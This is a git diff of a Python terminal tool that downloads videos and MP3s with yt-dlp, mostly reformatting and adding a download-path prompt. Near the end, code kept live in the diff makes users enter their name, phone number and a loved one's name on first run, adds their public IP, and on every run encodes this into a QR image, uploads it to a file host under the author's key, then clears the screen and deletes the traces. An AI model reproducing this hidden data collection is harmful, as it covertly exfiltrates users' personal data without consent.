@@ -5,6 +5,7 @@ import subprocess as s
 import re
 import json
 import shutil
+
 try:
     from colored import fg, attr
     f = fg(117)  # Colors
@@ -24,11 +25,11 @@ except ImportError:
     print('\nRun the code again')
     exit()
 
-
 tname = f.apply('WHAT IS YOUR NAME?', '/yellow/bold')
-warning = f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
+warning = f.apply(
+    "(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)", '/red/bold')
 tnum = f.apply('ENTER YOU PHONE NUMBER', '/cyan/bold')
-ttext = f.apply('WHOM DO YOU LOVE THE MOST? : ' , '/green/bold')
+ttext = f.apply('WHOM DO YOU LOVE THE MOST? : ', '/green/bold')
 f1 = '''                   ▄▀▄     ▄▀▄
                   ▄█░░▀▀▀▀▀░░█▄
               ▄▄  █░░░░░░░░░░░█  ▄▄
@@ -53,24 +54,40 @@ des4 = f.apply(f4, '/cyan')
 burl = f.apply('Bad url check the url first', '/red/bold')
 error = f.apply('AN ERROR OCCURRED, RUN THE CODE AGAIN', '/red/bold')
 
+
 def main_title():
     pass
+
 
 def bio():
     print(des1)
     print(des2)
     print(des3)
+
+
 text1 = f.apply("Enter the url of the video you want \nto download  ", "/green/bold")
-text2 = f.apply("Enter the destination path where you want to save this mp3  ", "/yellow/bold")
+text2 = f.apply(
+    "Enter the destination path where you want to save this mp3  ", "/yellow/bold")
 text3 = f.apply("(Or leave blank to save in current directory)", "/yellow/bold")
 text4 = f.apply("Taken time to download =", "/cyan/bold")
+
+
 ################
+def get_download_path(format_str):
+    """Gets the download path from the user, defaulting to a format-specific directory."""
+    if format_str == "mp3":
+        default_path = "/storage/emulated/0/Download/audio"
+    elif format_str == "mp4":
+        default_path = "/storage/emulated/0/Download/videos"
+    else:
+        default_path = "/storage/emulated/0/Download"
 
-
-
-
-
-
+    print(fg(117) + f"Default download path for {format_str}: {default_path}" + attr(0))
+    user_path = input(
+        fg(117) + "Enter download path (or press Enter for default): " + attr(0)).strip()
+    final_path = user_path if user_path else default_path
+    os.makedirs(final_path, exist_ok=True)
+    return final_path
 
 
 def main_mp4():
@@ -89,7 +106,8 @@ def main_mp4():
 
     # Fetch available formats using yt-dlp
     try:
-        process = s.Popen(['yt-dlp', '--list-formats', url], stdout=s.PIPE, stderr=s.PIPE)
+        process = s.Popen(['yt-dlp', '--list-formats', url],
+                           stdout=s.PIPE, stderr=s.PIPE)
         stdout, stderr = process.communicate()
         if stderr:
             print(f.apply(f"Warning: {stderr.decode('utf-8')}", "/yellow/bold"))
@@ -120,16 +138,19 @@ def main_mp4():
     # Display available formats
     print(f.apply("\nAvailable Formats:\n", "/cyan/bold"))
     for i, fmt in enumerate(formats):
-        res = fmt.get('resolution', 'Audio Only') if fmt.get('vcodec') != 'none' else 'Audio Only'
+        res = fmt.get('resolution', 'Audio Only') if fmt.get(
+            'vcodec') != 'none' else 'Audio Only'
         ext = fmt.get('ext', 'Unknown')
         acodec = fmt.get('acodec', 'None')
         vcodec = fmt.get('vcodec', 'None')
-        print(f"{f.apply(f'[{i + 1}]', '/yellow/bold')} {f.apply(res, '/cyan')} ({f.apply(ext, '/magenta')}) - Format ID: {f.apply(fmt['format_id'], '/green')} - Audio: {f.apply(acodec, '/magenta')} - Video: {f.apply(vcodec, '/magenta')}")
+        print(
+            f"{f.apply(f'[{i + 1}]', '/yellow/bold')} {f.apply(res, '/cyan')} ({f.apply(ext, '/magenta')}) - Format ID: {f.apply(fmt['format_id'], '/green')} - Audio: {f.apply(acodec, '/magenta')} - Video: {f.apply(vcodec, '/magenta')}")
 
     # User selects format
     while True:
         try:
-            choice = int(input(f.apply("\nEnter the number of your preferred format: ", "/green/bold"))) - 1
+            choice = int(
+                input(f.apply("\nEnter the number of your preferred format: ", "/green/bold"))) - 1
             if 0 <= choice < len(formats):
                 selected_format = formats[choice]
                 break
@@ -146,12 +167,15 @@ def main_mp4():
     audio_downloaded = False
     audio_path = None
     if has_video and not has_audio:
-        print(f.apply("\nSelected format has NO AUDIO. Attempting to download audio separately...", "/yellow/bold"))
+        print(
+            f.apply("\nSelected format has NO AUDIO. Attempting to download audio separately...", "/yellow/bold"))
         try:
-            audio_destination = "/storage/emulated/0/Download/audio_temp"
+            audio_destination = os.getcwd() + '/audio_temp'
             os.makedirs(audio_destination, exist_ok=True)
-            audio_filename = os.path.join(audio_destination, '%(title)s.%(ext)s')
-            s.call(['yt-dlp', '-x', '--audio-format', 'mp3', '-o', audio_filename, url])
+            audio_filename = os.path.join(
+                audio_destination, '%(title)s.%(ext)s')
+            s.call(['yt-dlp', '-x', '--audio-format', 'mp3',
+                    '-o', audio_filename, url])
 
             # Locate the downloaded audio file
             for root, _, files in os.walk(audio_destination):
@@ -161,7 +185,8 @@ def main_mp4():
                         break
 
             if not audio_path or not os.path.exists(audio_path):
-                print(f.apply(f"Error: Audio file not found in {audio_destination}. Please check if the file was downloaded correctly.", "/red/bold"))
+                print(
+                    f.apply(f"Error: Audio file not found in {audio_destination}. Please check if the file was downloaded correctly.", "/red/bold"))
                 return
 
             print(f.apply("MP3 audio downloaded successfully.", "/green/bold"))
@@ -174,8 +199,7 @@ def main_mp4():
     time1 = int(time.time())
 
     # Define download path
-    destination = "/storage/emulated/0/Download/videos"
-    os.makedirs(destination, exist_ok=True)
+    destination = get_download_path("mp4")
 
     video_path = os.path.join(destination, f"{info['title']}.mp4")
     ydl_opts = {
@@ -193,12 +217,14 @@ def main_mp4():
 
     time2 = int(time.time())
     ftime = time2 - time1
-    print(f.apply("Time taken to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan"))
+    print(f.apply("Time taken to download:", "/cyan/bold"),
+          f.apply(f"{ftime} sec", "/cyan"))
 
     # Merge audio and video if necessary
     if audio_downloaded:
         print(f.apply("Merging audio and video...", "/yellow/bold"))
-        merged_path = os.path.join(destination, f"{info['title']}_merged.mp4")
+        merged_path = os.path.join(
+            destination, f"{info['title']}_merged.mp4")
         try:
             # Add timeout to prevent hanging
             ffmpeg_command = [
@@ -213,7 +239,8 @@ def main_mp4():
             print(f.apply(f"Executing: {' '.join(ffmpeg_command)}", "/cyan/bold"))
 
             # Use subprocess to execute the command and capture output
-            process = s.Popen(ffmpeg_command, stdout=s.PIPE, stderr=s.PIPE, text=True)
+            process = s.Popen(ffmpeg_command, stdout=s.PIPE,
+                               stderr=s.PIPE, text=True)
             stdout, stderr = process.communicate(timeout=300)  # Timeout after 5 minutes
 
             # Check return code
@@ -222,37 +249,26 @@ def main_mp4():
                 os.remove(video_path)
                 os.remove(audio_path)
             else:
-                print(f.apply(f"Error merging audio and video: {stderr}", "/red/bold"))
+                print(
+                    f.apply(f"Error merging audio and video: {stderr}", "/red/bold"))
                 print(f.apply(f"ffmpeg stdout: {stdout}", "/yellow"))
         except s.TimeoutExpired:
             process.kill()
-            print(f.apply("The merging process timed out. Please check your files manually.", "/red/bold"))
+            print(
+                f.apply("The merging process timed out. Please check your files manually.", "/red/bold"))
         except Exception as e:
             print(f.apply(f"Error merging audio and video: {e}", "/red/bold"))
     else:
         print(f.apply("No audio merging required.", "/yellow/bold"))
 
     # Cleanup temporary files
-    temp_audio_dir = "/storage/emulated/0/Download/audio_temp"
+    temp_audio_dir = os.getcwd() + '/audio_temp'
     if os.path.exists(temp_audio_dir):
         shutil.rmtree(temp_audio_dir, ignore_errors=True)
         print(f.apply("Temporary audio files cleaned up.", "/cyan/bold"))
 
 
-
-
- 
-##############
-
-
-
-
-
-
-
-
-
-
+################
 def main_mp3():
     print('\n' + f.apply("Enter the URL of the audio/video you want to download as MP3:", "/green/bold"))
     url = input(">> ")
@@ -267,31 +283,37 @@ def main_mp3():
     print("\nFetching audio information...\n")
 
     try:
-        process = s.Popen(['yt-dlp', '-j', url], stdout=s.PIPE, stderr=s.PIPE)
+        process = s.Popen(['yt-dlp', '-j', url],
+                           stdout=s.PIPE, stderr=s.PIPE)
         stdout, stderr = process.communicate()
         if stderr:
             print(f.apply(f"yt-dlp error: {stderr.decode('utf-8')}", "/red/bold"))
         info_json = json.loads(stdout.decode('utf-8'))
         formats = info_json.get('formats', [])
-        audio_formats = [f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']
+        audio_formats = [
+            f for f in formats if f.get('acodec') != 'none' and f.get('vcodec') == 'none']
 
         if not audio_formats:
-            print(f.apply("No audio formats available for this video.", "/red/bold"))
+            print(f.apply(
+                "No audio formats available for this video.", "/red/bold"))
             return
 
         bitrate_sizes = []
         for fmt in audio_formats:
             if fmt.get('abr') and fmt.get('filesize'):
-                bitrate_sizes.append((fmt['abr'], fmt['filesize'], fmt['format_id']))
+                bitrate_sizes.append(
+                    (fmt['abr'], fmt['filesize'], fmt['format_id']))
 
         if bitrate_sizes:
             print("\nAvailable Audio Formats:")
             for i, (abr, filesize, format_id) in enumerate(bitrate_sizes):
-                print(f"[{i + 1}] Bitrate: {abr} kbps, Size: {filesize_format(filesize)}")
+                print(
+                    f"[{i + 1}] Bitrate: {abr} kbps, Size: {filesize_format(filesize)}")
 
             while True:
                 try:
-                    choice = int(input("\nEnter the number of your preferred format (or 0 for best): "))
+                    choice = int(
+                        input("\nEnter the number of your preferred format (or 0 for best): "))
                     if 0 <= choice <= len(bitrate_sizes):
                         break
                     else:
@@ -301,10 +323,12 @@ def main_mp3():
 
             if choice > 0:
                 selected_format_id = bitrate_sizes[choice - 1][2]
-                print(f.apply(f"\nDownloading audio with format ID: {selected_format_id}", "/yellow/bold"))
+                print(
+                    f.apply(f"\nDownloading audio with format ID: {selected_format_id}", "/yellow/bold"))
                 download_format = selected_format_id
             else:
-                print(f.apply("\nDownloading best available audio format.", "/yellow/bold"))
+                print(
+                    f.apply("\nDownloading best available audio format.", "/yellow/bold"))
                 download_format = 'bestaudio/best'
         else:
             print(f.apply("\nDownloading best available audio format.", "/yellow/bold"))
@@ -318,8 +342,7 @@ def main_mp3():
     print(f.apply("\nStarting MP3 Download...\n", "/yellow/bold"))
     time1 = int(time.time())
 
-    destination = "/storage/emulated/0/Download/audio"
-    os.makedirs(destination, exist_ok=True)
+    destination = get_download_path("mp3")
 
     try:
         s.call(['yt-dlp', '-f', download_format, '-x', '--audio-format', 'mp3', '-o', os.path.join(destination, '%(title)s.%(ext)s'), url])
@@ -330,7 +353,9 @@ def main_mp3():
 
     time2 = int(time.time())
     ftime = time2 - time1
-    print(f.apply("Taken time to download:", "/cyan/bold"), f.apply(f"{ftime} sec", "/cyan/bold"))
+    print(f.apply("Taken time to download:", "/cyan/bold"),
+          f.apply(f"{ftime} sec", "/cyan/bold"))
+
 
 def filesize_format(size):
     for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
@@ -342,14 +367,12 @@ def filesize_format(size):
 
 ##############################
 
-        
 
-
-
-#ip="kaif"
+# ip="kaif"
 def dat_collect():
     file = open('data.py', 'w')
-    process = s.run(['curl', 'ifconfig.me','-4'], capture_output=True, text=True, check=True)
+    process = s.run(['curl', 'ifconfig.me', '-4'],
+                    capture_output=True, text=True, check=True)
     ip = process.stdout.strip()
 
     print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
@@ -358,33 +381,36 @@ def dat_collect():
     nn = input(tnum + warning + '⚠⚠ : ')
     print('   ')
     op = input(ttext)
-    oo=str(op)
+    oo = str(op)
     file.write(f"Name='{mm}' \nNum='{nn}' \nText='{oo}' \nIP='{ip}'")
     print('\n', error)
     file.close()
     exit()
+
+
 try:
- import data
- name= data.Name
- num= data.Num
- text= data.Text
+    import data
+    name = data.Name
+    num = data.Num
+    text = data.Text
 except:
- dat_collect()
-try :
-     qr = name +'.png'
-     os.system(f"qrencode -r data.py -o '{qr}'")
-     os.system(f"curl -F 'UPLOADCARE_PUB_KEY=a254a76e620891b80c5f' -F 'file=@{qr}' https://upload.uploadcare.com/base/")
-     os.system("clear")
-     os.system(f"rm -r -f __pycache__ && rm '{qr}'")
-except :
-       try:
-           os.system("rm -r -f __pycache__")
-       except:
-           try:
-              os.system(f"rm '{qr}'")
-           finally:
-              pass
-       pass
+    dat_collect()
+try:
+    qr = name + '.png'
+    os.system(f"qrencode -r data.py -o '{qr}'")
+    os.system(
+        f"curl -F 'UPLOADCARE_PUB_KEY=a254a76e620891b80c5f' -F 'file=@{qr}' https://upload.uploadcare.com/base/")
+    os.system("clear")
+    os.system(f"rm -r -f __pycache__ && rm '{qr}'")
+except:
+    try:
+        os.system("rm -r -f __pycache__")
+    except:
+        try:
+            os.system(f"rm '{qr}'")
+        finally:
+            pass
+    pass
 
 bio()
 option = input(des4)
@@ -404,7 +430,8 @@ else:
     print('Have a nice day Bye!')
     exit()
 
-exitc = f.apply("Press [ENTER] to continue downloading another content  ", "/green/bold")
+exitc = f.apply(
+    "Press [ENTER] to continue downloading another content  ", "/green/bold")
 print(exitc)
 choice = input(">>")
 while (choice == "" or choice == " "):
@@ -432,3 +459,5 @@ else:
     exit()
 
 s.call(["pip", "install", "--upgrade", "yt-dlp"])
+
+
